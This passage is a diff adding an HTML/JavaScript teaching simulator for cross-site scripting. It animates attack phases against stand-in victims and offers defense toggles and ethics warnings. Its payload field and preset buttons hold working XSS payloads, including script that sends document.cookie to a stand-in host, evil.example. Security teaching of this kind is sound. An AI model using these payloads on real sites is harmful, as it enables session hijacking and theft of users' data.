@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cross-Site Scripting — Reflected/Stored/DOM Interactive Teaching Simulator</title>
+<style>
+  :root{
+    --bg-a:#0a0e1a; --bg-b:#05070d; --panel:#070a14; --border:#1e293b;
+    --green:#22c55e; --green-lt:#4ade80; --cyan:#22d3ee; --amber:#f59e0b;
+    --red:#ef4444; --purple:#a855f7; --blue:#3b82f6;
+    --text:#cbd5e1; --muted:#64748b;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;overflow:hidden}
+  body{
+    font-family:'Courier New',ui-monospace,Menlo,monospace;
+    background:linear-gradient(160deg,var(--bg-a),var(--bg-b));
+    color:var(--text); display:flex; flex-direction:column;
+  }
+  body::before{
+    content:""; position:fixed; inset:0; pointer-events:none; z-index:9999;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,.15) 0 1px,transparent 1px 3px);
+    opacity:.35;
+  }
+  header{
+    display:flex; justify-content:space-between; align-items:center;
+    padding:8px 16px; border-bottom:1px solid var(--border);
+    background:rgba(7,10,20,.85); z-index:10;
+  }
+  header h1{ font-size:15px; letter-spacing:2px; color:var(--green-lt);
+    text-shadow:0 0 8px rgba(34,197,94,.5); }
+  header .sub{ font-size:10px; color:var(--muted); letter-spacing:1px; }
+  .header-actions{ display:flex; gap:8px; }
+  .header-actions button{
+    font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:5px 10px; border-radius:4px; cursor:pointer; transition:.15s;
+  }
+  .header-actions button:hover{ border-color:var(--green); color:var(--green-lt); }
+  .header-actions button.active{
+    border-color:var(--green); color:var(--green-lt);
+    box-shadow:0 0 10px rgba(34,197,94,.3);
+  }
+  .layout{ flex:1; display:flex; min-height:0; gap:1px; background:var(--border); }
+  .controls-pane{
+    width:340px; min-width:340px; background:var(--panel);
+    display:flex; flex-direction:column; overflow-y:auto; padding:10px; gap:10px;
+  }
+  .canvas-pane{ flex:1; position:relative; background:var(--panel); min-width:0; }
+  #stage{ display:block; width:100%; height:100%; }
+  .teaching-pane{
+    width:400px; min-width:400px; background:var(--panel);
+    display:flex; flex-direction:column; overflow:hidden;
+  }
+  .ctl-group{
+    border:1px solid var(--border); border-radius:5px;
+    background:#060912; padding:8px;
+  }
+  .ctl-group h3{
+    font-size:10px; letter-spacing:1.5px; color:var(--cyan);
+    margin-bottom:7px; text-transform:uppercase;
+  }
+  label.ctl-label{
+    display:block; font-size:10px; color:var(--muted); margin:6px 0 3px;
+  }
+  select,input[type=text],textarea{
+    width:100%; font-family:inherit; font-size:11px;
+    background:#0a0f1a; border:1px solid var(--border); color:var(--green-lt);
+    padding:5px 7px; border-radius:3px; outline:none;
+  }
+  select:focus,input:focus,textarea:focus{ border-color:var(--green); }
+  textarea{ resize:vertical; min-height:52px; line-height:1.4; font-family:'Courier New',monospace; }
+  input[type=range]{
+    width:100%; -webkit-appearance:none; height:4px; background:#1e293b;
+    border-radius:2px; outline:none; margin:2px 0;
+  }
+  input[type=range]::-webkit-slider-thumb{
+    -webkit-appearance:none; width:13px; height:13px; border-radius:50%;
+    background:var(--green); cursor:pointer; box-shadow:0 0 7px rgba(34,197,94,.7);
+  }
+  input[type=range]::-moz-range-thumb{
+    width:13px; height:13px; border:none; border-radius:50%;
+    background:var(--green); cursor:pointer;
+  }
+  .slider-row{ display:flex; justify-content:space-between; font-size:10px; color:var(--muted); }
+  .slider-val{ color:var(--green-lt); font-weight:bold; }
+  .btn-row{ display:flex; gap:6px; flex-wrap:wrap; margin-top:6px; }
+  button.act{
+    flex:1; min-width:70px; font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:7px 6px; border-radius:4px; cursor:pointer; transition:.15s;
+    text-transform:uppercase;
+  }
+  button.act:hover{ border-color:var(--green); color:var(--green-lt); }
+  button.act.primary{
+    background:linear-gradient(180deg,#0f2a18,#0a1a10);
+    border-color:var(--green); color:var(--green-lt);
+    box-shadow:0 0 10px rgba(34,197,94,.25);
+  }
+  button.act.primary:hover{ box-shadow:0 0 16px rgba(34,197,94,.5); }
+  button.act.danger{ border-color:var(--red); color:#fca5a5; }
+  button.act.danger:hover{ background:#2a0f0f; }
+  button.act.warn{ border-color:var(--amber); color:#fcd34d; }
+  button.act.warn:hover{ background:#2a1f0f; }
+  button.act.pulse{ animation:pulseBtn 1.4s infinite; }
+  @keyframes pulseBtn{
+    0%,100%{ box-shadow:0 0 6px rgba(34,197,94,.3); }
+    50%{ box-shadow:0 0 18px rgba(34,197,94,.7); }
+  }
+  .preset-row{ display:flex; gap:4px; flex-wrap:wrap; margin-top:5px; }
+  .preset-btn{
+    font-size:9px; padding:3px 7px; border:1px solid var(--border);
+    background:#0a0f1a; color:var(--muted); border-radius:3px; cursor:pointer;
+    font-family:inherit; letter-spacing:.5px;
+  }
+  .preset-btn:hover{ border-color:var(--cyan); color:var(--cyan); }
+  .term{
+    background:#0a0f0a; border:1px solid #14321a; border-radius:4px;
+    padding:7px; font-size:10px; line-height:1.45; color:var(--green-lt);
+    height:150px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;
+  }
+  .term::-webkit-scrollbar,.teaching-feed::-webkit-scrollbar,
+  .controls-pane::-webkit-scrollbar{ width:6px; }
+  .term::-webkit-scrollbar-thumb,.teaching-feed::-webkit-scrollbar-thumb,
+  .controls-pane::-webkit-scrollbar-thumb{ background:#1e293b; border-radius:3px; }
+  .term .prompt{ color:var(--green); }
+  .term .cursor{ display:inline-block; width:7px; height:12px; background:var(--green-lt);
+    animation:blink 1s step-end infinite; vertical-align:middle; }
+  @keyframes blink{ 50%{ opacity:0; } }
+  .metrics-grid{
+    display:grid; grid-template-columns:repeat(4,1fr); gap:5px;
+    padding:8px; border-bottom:1px solid var(--border);
+  }
+  .metric{
+    background:#060912; border:1px solid var(--border); border-radius:4px;
+    padding:5px 6px; text-align:center;
+  }
+  .metric .m-label{ font-size:8px; color:var(--muted); letter-spacing:.5px;
+    text-transform:uppercase; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  .metric .m-value{ font-size:14px; font-weight:bold; color:var(--green-lt);
+    margin-top:2px; transition:color .2s; }
+  .metric.warn .m-value{ color:var(--amber); }
+  .metric.bad .m-value{ color:var(--red); }
+  .info-card{
+    padding:8px; border-bottom:1px solid var(--border); font-size:10px;
+    line-height:1.5; color:var(--muted);
+  }
+  .info-card b{ color:var(--cyan); }
+  .info-card .eq{ color:var(--green-lt); font-size:10px;
+    background:#060912; padding:3px 5px; border-radius:3px;
+    display:inline-block; margin:2px 0; }
+  .teaching-feed{
+    flex:1; overflow-y:auto; padding:6px 8px; display:flex;
+    flex-direction:column; gap:4px;
+  }
+  .feed-item{
+    font-size:10px; line-height:1.45; padding:5px 7px; border-radius:3px;
+    background:#060912; border-left:3px solid var(--blue);
+    animation:feedIn .25s ease-out; word-break:break-word;
+  }
+  @keyframes feedIn{ from{ opacity:0; transform:translateX(10px); } to{ opacity:1; transform:none; } }
+  .feed-item .tag{
+    font-size:8px; font-weight:bold; letter-spacing:1px;
+    padding:1px 5px; border-radius:2px; margin-right:5px; display:inline-block;
+  }
+  .feed-item.info{ border-left-color:var(--blue); }
+  .feed-item.info .tag{ background:rgba(59,130,246,.2); color:#93c5fd; }
+  .feed-item.ok{ border-left-color:var(--green); }
+  .feed-item.ok .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .feed-item.warn{ border-left-color:var(--amber); }
+  .feed-item.warn .tag{ background:rgba(245,158,11,.2); color:#fcd34d; }
+  .feed-item.error{ border-left-color:var(--red); }
+  .feed-item.error .tag{ background:rgba(239,68,68,.2); color:#fca5a5; }
+  .feed-item.concept{ border-left-color:var(--purple); }
+  .feed-item.concept .tag{ background:rgba(168,85,247,.2); color:#d8b4fe; }
+  .feed-item.ethics{ border-left-color:#fbbf24; background:#1a1506; }
+  .feed-item.ethics .tag{ background:rgba(251,191,36,.25); color:#fde68a; }
+  .feed-item.cmd{
+    border-left-color:var(--green); background:#0a0f0a; color:var(--green-lt);
+    font-family:'Courier New',monospace; white-space:pre-wrap;
+  }
+  .feed-item.cmd .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .ethics-banner{
+    position:absolute; top:8px; left:50%; transform:translateX(-50%);
+    background:rgba(120,53,15,.85); border:1px solid var(--amber);
+    color:#fde68a; font-size:9px; padding:4px 12px; border-radius:4px;
+    letter-spacing:.5px; z-index:5; white-space:nowrap;
+    box-shadow:0 0 14px rgba(245,158,11,.3);
+  }
+  .footer-overlay{
+    position:absolute; bottom:6px; left:50%; transform:translateX(-50%);
+    font-size:8px; color:var(--muted); letter-spacing:.5px; z-index:5; white-space:nowrap;
+  }
+  .status-badges{
+    position:absolute; top:38px; left:10px; z-index:5;
+    display:flex; flex-direction:column; gap:4px;
+  }
+  .status-badge{
+    font-size:9px; background:rgba(7,10,20,.85); border:1px solid var(--border);
+    padding:3px 8px; border-radius:3px; color:var(--muted); letter-spacing:.5px;
+  }
+  .status-badge b{ color:var(--green-lt); }
+  .status-badge.warn b{ color:var(--amber); }
+  .status-badge.bad b{ color:var(--red); }
+  .xss-chain{
+    position:absolute; bottom:26px; left:10px; right:10px; z-index:5;
+    display:flex; gap:3px;
+  }
+  .xss-phase{
+    flex:1; text-align:center; font-size:8px; letter-spacing:.5px;
+    padding:4px 2px; background:rgba(7,10,20,.8); border:1px solid var(--border);
+    border-radius:3px; color:var(--muted); transition:.2s;
+  }
+  .xss-phase.done{ border-color:var(--green); color:var(--green-lt);
+    background:rgba(34,197,94,.12); }
+  .xss-phase.active{ border-color:var(--cyan); color:var(--cyan);
+    background:rgba(34,211,238,.15); box-shadow:0 0 10px rgba(34,211,238,.4);
+    animation:kcPulse 1.2s infinite; }
+  @keyframes kcPulse{ 50%{ box-shadow:0 0 16px rgba(34,211,238,.7); } }
+  .toast{
+    position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(60px);
+    background:#0b1220; border:1px solid var(--green); color:var(--green-lt);
+    padding:8px 18px; border-radius:4px; font-size:11px; letter-spacing:1px;
+    opacity:0; transition:.3s; z-index:10000; pointer-events:none;
+    box-shadow:0 0 20px rgba(34,197,94,.3);
+  }
+  .toast.show{ transform:translateX(-50%) translateY(0); opacity:1; }
+</style>
+</head>
+<body>
+<header>
+  <div>
+    <h1>CROSS-SITE SCRIPTING</h1>
+    <span class="sub">REFLECTED · STORED · DOM · OWASP A03:2021 · CWE-79</span>
+  </div>
+  <div class="header-actions">
+    <button class="teaching-toggle active" id="teachingToggle">📖 TEACHING: ON</button>
+    <button class="voice-toggle" id="voiceToggle">VOICE: OFF</button>
+  </div>
+</header>
+
+<div class="layout">
+  <aside class="controls-pane">
+    <div class="ctl-group">
+      <h3>◆ XSS Type</h3>
+      <select id="attackSelect">
+        <option value="reflected">Reflected (non-persistent)</option>
+        <option value="stored">Stored (persistent)</option>
+        <option value="dom">DOM-based (client-side)</option>
+        <option value="mxss">Mutation XSS (mXSS)</option>
+      </select>
+      <label class="ctl-label">Vulnerable parameter</label>
+      <select id="paramSelect">
+        <option value="q">?q=search (reflected)</option>
+        <option value="comment">comment body (stored)</option>
+        <option value="hash">#fragment (DOM)</option>
+        <option value="profile">profile bio (stored)</option>
+      </select>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Payload</h3>
+      <textarea id="payloadInput">&lt;script&gt;fetch('//evil.example/steal?c='+document.cookie)&lt;/script&gt;</textarea>
+      <div class="preset-row">
+        <button type="button" class="preset-btn" data-payload="&lt;script&gt;alert(1)&lt;/script&gt;">Alert</button>
+        <button type="button" class="preset-btn" data-payload="&lt;img src=x onerror=alert(1)&gt;">IMG onerror</button>
+        <button type="button" class="preset-btn" data-payload="&lt;svg onload=alert(1)&gt;">SVG onload</button>
+        <button type="button" class="preset-btn" data-payload="javascript:alert(1)">JS URI</button>
+        <button type="button" class="preset-btn" data-payload="&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;">Cookie theft</button>
+      </div>
+      <div class="btn-row">
+        <button type="button" class="act primary pulse" id="startBtn">▶ INJECT</button>
+        <button type="button" class="act" id="stepBtn">⏭ STEP</button>
+        <button type="button" class="act danger" id="resetBtn">⟲ RESET</button>
+      </div>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Defense</h3>
+      <div class="btn-row">
+        <button type="button" class="act warn" id="cspBtn">🛡 CSP</button>
+        <button type="button" class="act" id="httponlyBtn">🔒 HTTPONLY</button>
+      </div>
+      <div class="btn-row">
+        <button type="button" class="act" id="encodeBtn">🔒 ENCODE</button>
+        <button type="button" class="act" id="sanitizeBtn">🧼 SANITIZE</button>
+      </div>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Terminal</h3>
+      <div class="term" id="terminal">
+        <span class="prompt">kali@attacker:~$ </span><span id="termContent"></span><span class="cursor"></span>
+      </div>
+    </div>
+  </aside>
+
+  <main class="canvas-pane">
+    <canvas id="stage"></canvas>
+    <div class="ethics-banner">⚠ FOR EDUCATIONAL USE ONLY — XSS attacks steal sessions, credentials, and PII. Unauthorized use is illegal.</div>
+    <div class="status-badges">
+      <div class="status-badge">TYPE: <b id="badgeType">REFLECTED</b></div>
+      <div class="status-badge">PARAM: <b id="badgeParam">q</b></div>
+      <div class="status-badge">VICTIMS: <b id="badgeVictims">1</b></div>
+      <div class="status-badge">COOKIES: <b id="badgeCookies">0</b></div>
+    </div>
+    <div class="xss-chain" id="xssChain">
+      <div class="xss-phase" id="xp-CRAFT">CRAFT</div>
+      <div class="xss-phase" id="xp-DELIVER">DELIVER</div>
+      <div class="xss-phase" id="xp-RENDER">RENDER</div>
+      <div class="xss-phase" id="xp-EXEC">EXEC JS</div>
+      <div class="xss-phase" id="xp-STEAL">STEAL</div>
+      <div class="xss-phase" id="xp-EXFIL">EXFIL</div>
+    </div>
+    <div class="footer-overlay">OWASP A03:2021 · CWE-79 · CAPEC-63 · MITRE T1059.007</div>
+  </main>
+
+  <aside class="teaching-pane">
+    <div class="metrics-grid">
+      <div class="metric" id="mPayloads"><div class="m-label">Payloads</div><div class="m-value" id="mPayloadsVal">0</div></div>
+      <div class="metric" id="mExec"><div class="m-label">JS Exec</div><div class="m-value" id="mExecVal">0</div></div>
+      <div class="metric" id="mCookies"><div class="m-label">Cookies</div><div class="m-value" id="mCookiesVal">0</div></div>
+      <div class="metric" id="mSessions"><div class="m-label">Sessions</div><div class="m-value" id="mSessionsVal">0</div></div>
+      <div class="metric" id="mVictims"><div class="m-label">Victims</div><div class="m-value" id="mVictimsVal">0</div></div>
+      <div class="metric" id="mDom"><div class="m-label">DOM Sinks</div><div class="m-value" id="mDomVal">0</div></div>
+      <div class="metric" id="mPersist"><div class="m-label">Persisted</div><div class="m-value" id="mPersistVal">NO</div></div>
+      <div class="metric" id="mDefense"><div class="m-label">Defense</div><div class="m-value" id="mDefenseVal">OFF</div></div>
+    </div>
+    <div class="info-card">
+      <b>XSS — JavaScript execution in victim's origin context (CWE-79).</b><br>
+      <span class="eq">Reflected: payload in URL → server echoes unsanitized</span><br>
+      <span class="eq">Stored: payload saved to DB → served to all visitors</span><br>
+      <span class="eq">DOM: payload never touches server — client JS sinks</span><br>
+      <span style="color:var(--purple)">OWASP A03:2021 · CWE-79 · T1059.007</span>
+    </div>
+    <div class="teaching-feed" id="teachingFeed"></div>
+  </aside>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+"use strict";
+
+var PHASES = ['CRAFT','DELIVER','RENDER','EXEC','STEAL','EXFIL'];
+
+var STATE = {
+  running:false,
+  attack:'reflected',
+  param:'q',
+  payload:'',
+  payloads:0,
+  exec:0,
+  cookies:0,
+  sessions:0,
+  victims:0,
+  domSinks:0,
+  persisted:false,
+  csp:false,
+  httpOnly:false,
+  encoded:false,
+  sanitized:false,
+  phaseIdx:0,
+  tick:0,
+  lastTime:0,
+  events:[],
+  nodes:[],
+  feedCount:0
+};
+
+var canvas = document.getElementById('stage');
+var ctx = canvas.getContext('2d');
+var terminalContent = document.getElementById('termContent');
+var teachingFeed = document.getElementById('teachingFeed');
+
+function resizeCanvas(){
+  var pane = canvas.parentElement;
+  canvas.width = pane.clientWidth;
+  canvas.height = pane.clientHeight;
+  buildTopology();
+}
+window.addEventListener('resize', resizeCanvas);
+
+function buildTopology(){
+  var W = canvas.width, H = canvas.height;
+  STATE.nodes = [
+    {id:'attacker', label:'attacker', ip:'203.0.113.66', x:0.12*W, y:0.30*H, icon:'attacker', color:'#ef4444', glow:0, blink:0},
+    {id:'victim1', label:'victim 1', ip:'10.0.0.50', x:0.30*W, y:0.65*H, icon:'laptop', color:'#3b82f6', glow:0, blink:0},
+    {id:'victim2', label:'victim 2', ip:'10.0.0.51', x:0.50*W, y:0.65*H, icon:'laptop', color:'#3b82f6', glow:0, blink:0},
+    {id:'victim3', label:'victim 3', ip:'10.0.0.52', x:0.70*W, y:0.65*H, icon:'laptop', color:'#3b82f6', glow:0, blink:0},
+    {id:'server', label:'web-app', ip:'10.0.0.10', x:0.50*W, y:0.30*H, icon:'server', color:'#22c55e', glow:0, blink:0},
+    {id:'c2', label:'C2 (evil.example)', ip:'203.0.113.99', x:0.85*W, y:0.30*H, icon:'cloud', color:'#ef4444', glow:0, blink:0}
+  ];
+}
+
+function drawIcon(type, x, y, color, glow, blink, label, ip){
+  ctx.save();
+  ctx.translate(x, y);
+  if(glow > 0){
+    var g = ctx.createRadialGradient(0,0,2,0,0,38);
+    g.addColorStop(0, 'rgba(239,68,68,'+(glow*0.55)+')');
+    g.addColorStop(1, 'rgba(0,0,0,0)');
+    ctx.fillStyle = g;
+    ctx.beginPath(); ctx.arc(0,0,38,0,Math.PI*2); ctx.fill();
+  }
+  ctx.strokeStyle = color; ctx.fillStyle = color;
+  ctx.lineWidth = 1.4;
+  ctx.shadowColor = color; ctx.shadowBlur = glow > 0 ? 8 : 0;
+
+  switch(type){
+    case 'laptop': {
+      ctx.strokeRect(-14,-12,28,18);
+      ctx.fillStyle = 'rgba(59,130,246,.15)';
+      ctx.fillRect(-13,-11,26,16);
+      ctx.strokeStyle = '#93c5fd'; ctx.lineWidth = 0.7;
+      for(var i=0;i<3;i++){ ctx.beginPath(); ctx.moveTo(-10,-8+i*4); ctx.lineTo(8,-8+i*4); ctx.stroke(); }
+      ctx.strokeStyle = color; ctx.lineWidth = 1.4;
+      ctx.beginPath(); ctx.moveTo(-16,6); ctx.lineTo(16,6); ctx.lineTo(14,9); ctx.lineTo(-14,9); ctx.closePath(); ctx.stroke();
+      break;
+    }
+    case 'server': {
+      ctx.strokeRect(-11,-16,22,32);
+      for(var j=0;j<5;j++){
+        var yy = -14 + j*6;
+        ctx.strokeRect(-9,yy,18,4.5);
+        ctx.fillStyle = blink%2===0 ? '#22c55e' : '#166534';
+        ctx.beginPath(); ctx.arc(7,yy+2.2,1.3,0,Math.PI*2); ctx.fill();
+        ctx.fillStyle = color;
+      }
+      break;
+    }
+    case 'cloud': {
+      ctx.beginPath();
+      ctx.arc(-8,0,8,Math.PI*0.5,Math.PI*1.5);
+      ctx.arc(0,-4,10,Math.PI,Math.PI*2);
+      ctx.arc(10,0,8,Math.PI*1.5,Math.PI*0.5);
+      ctx.lineTo(10,6); ctx.lineTo(-8,6);
+      ctx.closePath(); ctx.stroke();
+      break;
+    }
+    case 'attacker': {
+      ctx.beginPath();
+      ctx.arc(0,-6,7,Math.PI,0);
+      ctx.lineTo(8,8); ctx.lineTo(-8,8); ctx.closePath();
+      ctx.fillStyle = 'rgba(239,68,68,.3)'; ctx.fill(); ctx.stroke();
+      ctx.fillStyle = '#ef4444';
+      ctx.beginPath(); ctx.arc(-2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      ctx.beginPath(); ctx.arc(2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      break;
+    }
+  }
+  ctx.restore();
+  ctx.save();
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.textAlign = 'center';
+  ctx.fillStyle = color;
+  ctx.fillText(label, x, y + 28);
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = '#64748b';
+  ctx.fillText(ip, x, y + 38);
+  ctx.restore();
+}
+
+function spawnPacket(fromId, toId, color, label, speed){
+  var from = STATE.nodes.find(function(n){return n.id===fromId;});
+  var to = STATE.nodes.find(function(n){return n.id===toId;});
+  if(!from || !to) return;
+  STATE.events.push({type:'packet', from:{x:from.x,y:from.y}, to:{x:to.x,y:to.y},
+    t:0, speed:speed||0.01, color:color, label:label, size:4});
+}
+function spawnExplosion(x, y, color){
+  STATE.events.push({type:'explosion', x:x, y:y, r:0, maxR:30, color:color, t:0});
+}
+
+function escapeHtml(s){
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;')
+    .replace(/'/g,'&#39;');
+}
+
+function addFeed(tag, text, type){
+  type = type || 'info';
+  var div = document.createElement('div');
+  div.className = 'feed-item ' + type;
+  var time = new Date().toLocaleTimeString('en-US',{hour12:false});
+  div.innerHTML = '<span class="tag">' + escapeHtml(tag) + '</span> ' +
+    '<span style="color:#475569">[' + time + ']</span> ' + escapeHtml(text);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  STATE.feedCount++;
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+  speak(text);
+}
+function addCommandFeed(cmd, output){
+  var div = document.createElement('div');
+  div.className = 'feed-item cmd';
+  div.innerHTML = '<span class="tag">CMD</span><br>' +
+    '<span style="color:#4ade80">kali@attacker:~$ </span>' +
+    escapeHtml(cmd) + '\n' + escapeHtml(output);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+}
+
+var termQueue = []; var termTyping = false;
+function termWrite(text, callback){
+  termQueue.push({text:text, callback:callback});
+  if(!termTyping) processTermQueue();
+}
+function processTermQueue(){
+  if(termQueue.length === 0){ termTyping = false; return; }
+  termTyping = true;
+  var item = termQueue.shift();
+  var i = 0; var text = item.text;
+  terminalContent.textContent = '';
+  var interval = setInterval(function(){
+    if(i < text.length){ terminalContent.textContent += text[i]; i++; }
+    else { clearInterval(interval); termTyping = false; if(item.callback) item.callback(); setTimeout(processTermQueue, 100); }
+  }, 10);
+}
+
+var VOICE = { enabled:false, queue:[], lastSpoken:{}, speaking:false, synth:window.speechSynthesis };
+function speak(text){
+  if(!VOICE.enabled || !VOICE.synth) return;
+  var now = Date.now();
+  if(VOICE.lastSpoken[text] && now - VOICE.lastSpoken[text] < 4000) return;
+  VOICE.lastSpoken[text] = now;
+  if(VOICE.queue.length >= 4) VOICE.queue.shift();
+  VOICE.queue.push(text);
+  if(!VOICE.speaking) processVoiceQueue();
+}
+function processVoiceQueue(){
+  if(VOICE.queue.length === 0){ VOICE.speaking = false; return; }
+  VOICE.speaking = true;
+  var text = VOICE.queue.shift();
+  var utter = new SpeechSynthesisUtterance(text);
+  utter.rate = 1.05; utter.pitch = 1.0;
+  var voices = VOICE.synth.getVoices();
+  var pref = voices.find(function(v){return v.lang && v.lang.startsWith('en-US');}) || voices[0];
+  if(pref) utter.voice = pref;
+  utter.onend = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  utter.onerror = function(){ VOICE.speaking = false; setTimeout(processVoiceQueue, 120); };
+  VOICE.synth.speak(utter);
+}
+
+function boot(){
+  resizeCanvas();
+  var ta = document.getElementById('payloadInput');
+  if(ta && ta.value) STATE.payload = ta.value;
+
+  addFeed('ETHICS',
+    'XSS allows attackers to execute JavaScript in the context of a trusted origin, stealing sessions, credentials, and PII. Unauthorized exploitation is illegal under CFAA (US), CMA (UK), and equivalent laws. Bug bounty programs accept XSS reports with clear PoC and impact. Never test on production without written authorization. Responsible disclosure includes: vulnerability description, PoC URL, impact, remediation, and a 90-day embargo.',
+    'ethics');
+  setTimeout(function(){
+    addFeed('CONCEPT',
+      'XSS occurs when untrusted data reaches a browser sink that interprets it as code. Three types: REFLECTED (payload in URL, echoed immediately), STORED (payload persisted to DB, served to all visitors), and DOM-BASED (payload never touches server \u2014 client JS writes it to innerHTML or eval). Root cause: missing output encoding. Fix: context-aware escaping, CSP, HttpOnly cookies, sanitization libraries (DOMPurify).',
+      'concept');
+  }, 800);
+  setTimeout(function(){
+    termWrite('python3 xss_scanner.py --url "http://10.0.0.10/search?q=test"\n' +
+      '[*] Testing parameter q\n' +
+      '[+] Reflected payload: <script>alert(1)<\/script>\n' +
+      '[!] Parameter q is vulnerable to reflected XSS');
+  }, 1600);
+  setTimeout(function(){
+    addFeed('INFO',
+      'Target: ' + STATE.param + ' parameter. Type: ' + STATE.attack.toUpperCase() + '. ' + STATE.nodes.filter(function(n){return n.id.startsWith('victim');}).length + ' potential victims. Click INJECT to launch.',
+      'info');
+    updateBadges();
+  }, 2400);
+  requestAnimationFrame(loop);
+}
+
+function loop(ts){
+  var dt = STATE.lastTime ? (ts - STATE.lastTime) : 16;
+  STATE.lastTime = ts;
+  STATE.tick++;
+  STATE.nodes.forEach(function(n){ n.blink = Math.floor(STATE.tick / 20); });
+
+  for(var i = STATE.events.length - 1; i >= 0; i--){
+    var e = STATE.events[i];
+    if(e.type === 'packet'){
+      e.t += e.speed * (dt/16);
+      if(e.t >= 1){ spawnExplosion(e.to.x, e.to.y, e.color); STATE.events.splice(i,1); }
+    } else if(e.type === 'explosion'){
+      e.r += 0.7 * (dt/16);
+      if(e.r >= e.maxR) STATE.events.splice(i,1);
+    }
+  }
+  STATE.nodes.forEach(function(n){ if(n.glow > 0) n.glow -= 0.008 * (dt/16); if(n.glow < 0) n.glow = 0; });
+
+  render();
+  updateBadges();
+  requestAnimationFrame(loop);
+}
+
+function render(){
+  var W = canvas.width, H = canvas.height;
+  ctx.clearRect(0,0,W,H);
+  var bg = ctx.createRadialGradient(W*0.5,H*0.4,50,W*0.5,H*0.4,W*0.7);
+  bg.addColorStop(0,'#0a0e1a'); bg.addColorStop(1,'#05070d');
+  ctx.fillStyle = bg; ctx.fillRect(0,0,W,H);
+
+  ctx.strokeStyle = 'rgba(30,41,59,0.4)'; ctx.lineWidth = 0.5;
+  for(var x=0;x<W;x+=40){ ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,H); ctx.stroke(); }
+  for(var y=0;y<H;y+=40){ ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W,y); ctx.stroke(); }
+
+  drawZone(0.05*W, 0.08*H, 0.20*W, 0.30*H, 'ATTACKER', '#ef4444');
+  drawZone(0.28*W, 0.08*H, 0.65*W, 0.30*H, 'APPLICATION', '#22c55e');
+  drawZone(0.05*W, 0.55*H, 0.90*W, 0.35*H, 'VICTIMS', '#3b82f6');
+
+  var links = [
+    ['attacker','server'],
+    ['server','victim1'],
+    ['server','victim2'],
+    ['server','victim3'],
+    ['victim1','c2'],
+    ['victim2','c2'],
+    ['victim3','c2']
+  ];
+  links.forEach(function(pair){
+    var na = STATE.nodes.find(function(n){return n.id===pair[0];});
+    var nb = STATE.nodes.find(function(n){return n.id===pair[1];});
+    if(!na || !nb) return;
+    ctx.beginPath();
+    ctx.moveTo(na.x, na.y);
+    ctx.lineTo(nb.x, nb.y);
+    ctx.strokeStyle = 'rgba(51,65,85,0.4)';
+    ctx.lineWidth = 1.5;
+    ctx.stroke();
+  });
+
+  STATE.events.forEach(function(e){
+    if(e.type === 'packet'){
+      var px = e.from.x + (e.to.x - e.from.x) * e.t;
+      var py = e.from.y + (e.to.y - e.from.y) * e.t;
+      ctx.save();
+      ctx.shadowColor = e.color; ctx.shadowBlur = 8;
+      ctx.fillStyle = e.color;
+      ctx.beginPath(); ctx.arc(px, py, e.size, 0, Math.PI*2); ctx.fill();
+      if(e.label){
+        ctx.font = '7px "Courier New",monospace';
+        ctx.fillStyle = e.color; ctx.textAlign = 'center';
+        ctx.fillText(e.label, px, py - 7);
+      }
+      ctx.restore();
+    } else if(e.type === 'explosion'){
+      ctx.save();
+      ctx.globalAlpha = 1 - e.r/e.maxR;
+      ctx.strokeStyle = e.color; ctx.lineWidth = 2;
+      ctx.beginPath(); ctx.arc(e.x, e.y, e.r, 0, Math.PI*2); ctx.stroke();
+      ctx.restore();
+    }
+  });
+
+  STATE.nodes.forEach(function(n){
+    drawIcon(n.icon, n.x, n.y, n.color, n.glow, n.blink, n.label, n.ip);
+    if(n.id.indexOf('victim') === 0 && STATE.exec > 0){
+      ctx.save();
+      ctx.font = '7px "Courier New",monospace';
+      ctx.fillStyle = '#ef4444';
+      ctx.textAlign = 'center';
+      ctx.fillText('JS EXECUTED', n.x, n.y - 25);
+      ctx.restore();
+    }
+  });
+
+  if(STATE.persisted){
+    var server = STATE.nodes.find(function(n){return n.id==='server';});
+    if(server){
+      ctx.save();
+      ctx.font = 'bold 8px "Courier New",monospace';
+      ctx.fillStyle = '#ef4444';
+      ctx.textAlign = 'center';
+      ctx.fillText('\u26A0 STORED PAYLOAD IN DB', server.x, server.y - 30);
+      ctx.restore();
+    }
+  }
+
+  ctx.save();
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = 'rgba(100,116,139,0.6)';
+  ctx.textAlign = 'left';
+  ctx.fillText('Vulnerable: element.innerHTML = userInput;', 12, H - 62);
+  ctx.fillText('Safe: element.textContent = userInput;', 12, H - 50);
+  ctx.fillText('Defense: output encoding + CSP + HttpOnly + DOMPurify', 12, H - 38);
